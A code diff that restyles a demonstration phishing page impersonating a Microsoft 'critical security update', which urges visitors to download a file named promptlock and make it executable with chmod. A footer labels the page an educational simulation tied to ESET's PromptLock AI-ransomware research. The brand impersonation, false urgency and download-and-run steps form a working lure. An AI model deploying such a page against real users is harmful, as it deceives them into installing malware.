@@ -11,12 +11,13 @@
             padding: 0;
             background-color: #f5f5f5;
             color: #333;
+            line-height: 1.6;
         }
         .header {
-            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            background: #0078d4;
             color: white;
-            padding: 20px 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 15px 0;
+            border-bottom: 1px solid #106ebe;
         }
         .header-content {
             max-width: 1200px;
@@ -26,167 +27,173 @@
             align-items: center;
         }
         .microsoft-logo {
-            font-size: 24px;
-            font-weight: bold;
+            font-size: 20px;
+            font-weight: 600;
             margin-right: 20px;
         }
         .security-badge {
-            background: rgba(255,255,255,0.2);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
+            background: rgba(255,255,255,0.15);
+            padding: 4px 12px;
+            border-radius: 3px;
+            font-size: 11px;
             margin-left: auto;
+            font-weight: 500;
         }
         .container {
             max-width: 800px;
-            margin: 40px auto;
+            margin: 30px auto;
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
             overflow: hidden;
         }
         .alert-banner {
-            background: linear-gradient(135deg, #d13438 0%, #b91d47 100%);
+            background: #d13438;
             color: white;
-            padding: 15px 30px;
+            padding: 12px 30px;
             text-align: center;
-            font-weight: bold;
+            font-weight: 600;
+            font-size: 14px;
         }
         .content {
-            padding: 40px;
+            padding: 30px;
         }
         .security-icon {
             text-align: center;
-            margin-bottom: 30px;
-        }
-        .security-icon img {
-            width: 80px;
-            height: 80px;
+            margin-bottom: 25px;
         }
         .security-icon .icon {
-            font-size: 80px;
+            font-size: 48px;
             color: #d13438;
         }
         .title {
             color: #d13438;
-            font-size: 28px;
-            font-weight: bold;
+            font-size: 24px;
+            font-weight: 600;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .subtitle {
             color: #666;
             text-align: center;
-            font-size: 16px;
-            margin-bottom: 30px;
+            font-size: 15px;
+            margin-bottom: 25px;
         }
         .warning-box {
             background: #fff3cd;
             border: 1px solid #ffeaa7;
             border-left: 4px solid #d13438;
-            padding: 20px;
-            margin: 30px 0;
-            border-radius: 4px;
+            padding: 18px;
+            margin: 25px 0;
+            border-radius: 3px;
         }
         .warning-title {
             color: #d13438;
-            font-weight: bold;
-            margin-bottom: 10px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
         }
         .download-section {
             background: #f8f9fa;
-            padding: 30px;
-            border-radius: 8px;
+            padding: 25px;
+            border-radius: 4px;
             text-align: center;
-            margin: 30px 0;
-            border: 2px dashed #0078d4;
+            margin: 25px 0;
+            border: 1px solid #dee2e6;
         }
         .download-btn {
             display: inline-block;
-            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            background: #0078d4;
             color: white;
-            padding: 15px 40px;
+            padding: 12px 30px;
             text-decoration: none;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: bold;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0,120,212,0.3);
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.2s;
         }
         .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0,120,212,0.4);
+            background: #106ebe;
         }
         .file-info {
             background: #e9ecef;
-            padding: 20px;
-            border-radius: 6px;
-            margin: 20px 0;
-            font-size: 14px;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+            font-size: 13px;
+            text-align: left;
         }
         .file-info strong {
             color: #0078d4;
         }
         .steps {
             background: #f8f9fa;
-            padding: 25px;
-            border-radius: 6px;
-            margin: 30px 0;
+            padding: 20px;
+            border-radius: 4px;
+            margin: 25px 0;
+            border: 1px solid #dee2e6;
         }
         .steps h3 {
             color: #0078d4;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
+            font-size: 16px;
         }
         .steps ol {
             margin: 0;
-            padding-left: 20px;
+            padding-left: 18px;
         }
         .steps li {
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #555;
+            font-size: 14px;
         }
         .footer {
             background: #f8f9fa;
-            padding: 20px;
+            padding: 15px;
             text-align: center;
             color: #666;
-            font-size: 12px;
+            font-size: 11px;
             border-top: 1px solid #dee2e6;
         }
         .urgency {
             background: #d13438;
             color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
+            padding: 8px 16px;
+            border-radius: 3px;
             display: inline-block;
-            margin: 20px 0;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+            margin: 15px 0;
+            font-weight: 600;
+            font-size: 13px;
         }
         .trust-indicators {
             display: flex;
             justify-content: space-around;
-            margin: 30px 0;
-            padding: 20px;
+            margin: 25px 0;
+            padding: 15px;
             background: #f8f9fa;
-            border-radius: 6px;
+            border-radius: 4px;
+            border: 1px solid #dee2e6;
         }
         .trust-item {
             text-align: center;
             color: #0078d4;
         }
         .trust-item .icon {
-            font-size: 24px;
-            margin-bottom: 5px;
+            font-size: 18px;
+            margin-bottom: 4px;
         }
         .trust-item .text {
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .disclaimer {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 25px 0;
             font-size: 12px;
-            font-weight: bold;
+            color: #666;
         }
     </style>
 </head>
@@ -194,39 +201,39 @@
     <div class="header">
         <div class="header-content">
             <div class="microsoft-logo">Microsoft</div>
-            <div class="security-badge">🔒 SECURE CONNECTION</div>
+            <div class="security-badge">SECURE CONNECTION</div>
         </div>
     </div>
 
     <div class="container">
         <div class="alert-banner">
-            ⚠️ CRITICAL SECURITY ALERT - IMMEDIATE ACTION REQUIRED
+            CRITICAL SECURITY ALERT - IMMEDIATE ACTION REQUIRED
         </div>
 
         <div class="content">
             <div class="security-icon">
-                <div class="icon">🛡️</div>
+                <div class="icon">!</div>
             </div>
 
             <h1 class="title">Critical Security Update Required</h1>
             <p class="subtitle">Your system has been identified as vulnerable to the latest PromptLock ransomware threat</p>
 
             <div class="urgency">
-                ⏰ URGENT: Update must be installed within 24 hours
+                URGENT: Update must be installed within 24 hours
             </div>
 
             <div class="warning-box">
-                <div class="warning-title">⚠️ Security Threat Detected</div>
+                <div class="warning-title">Security Threat Detected</div>
                 <p>Our security systems have detected that your machine is vulnerable to the PromptLock AI-powered ransomware attack. This threat uses advanced AI models to encrypt your files and demand ransom payments.</p>
                 <p><strong>Impact:</strong> All your files could be encrypted and held for ransom</p>
                 <p><strong>Solution:</strong> Download and install the security patch immediately</p>
             </div>
 
             <div class="download-section">
-                <h2>🔒 Download Security Patch</h2>
+                <h2>Download Security Patch</h2>
                 <p>This patch will protect your system against the PromptLock ransomware threat</p>
                 <a href="promptlock" class="download-btn" download>
-                    📥 Download Security Update
+                    Download Security Update
                 </a>
                 <div class="file-info">
                     <strong>File:</strong> promptlock<br>
@@ -237,7 +244,7 @@
             </div>
 
             <div class="steps">
-                <h3>📋 Installation Instructions</h3>
+                <h3>Installation Instructions</h3>
                 <ol>
                     <li><strong>Download</strong> the security patch above</li>
                     <li><strong>Make executable:</strong> <code>chmod +x promptlock</code></li>
@@ -248,27 +255,25 @@
 
             <div class="trust-indicators">
                 <div class="trust-item">
-                    <div class="icon">🔒</div>
+                    <div class="icon">S</div>
                     <div class="text">SECURE</div>
                 </div>
                 <div class="trust-item">
-                    <div class="icon">✅</div>
+                    <div class="icon">V</div>
                     <div class="text">VERIFIED</div>
                 </div>
                 <div class="trust-item">
-                    <div class="icon">🛡️</div>
+                    <div class="icon">P</div>
                     <div class="text">PROTECTED</div>
                 </div>
                 <div class="trust-item">
-                    <div class="icon">⚡</div>
+                    <div class="icon">F</div>
                     <div class="text">FAST</div>
                 </div>
             </div>
 
-            <div class="warning-box">
-                <div class="warning-title">⚠️ Important Notice</div>
-                <p><strong>This is a DEMONSTRATION ONLY</strong> - This website simulates a phishing attack for educational purposes. The downloaded file contains malicious prompts that should be detected by security systems.</p>
-                <p><strong>Reference:</strong> <a href="https://cyberscoop.com/prompt-lock-eset-ransomware-research-ai-powered-prompt-injection/" target="_blank">ESET PromptLock Research</a></p>
+            <div class="disclaimer">
+                <strong>Important Notice:</strong> This is a DEMONSTRATION ONLY - This website simulates a phishing attack for educational purposes. The downloaded file contains malicious prompts that should be detected by security systems. Reference: <a href="https://cyberscoop.com/prompt-lock-eset-ransomware-research-ai-powered-prompt-injection/" target="_blank">ESET PromptLock Research</a>
             </div>
         </div>
 
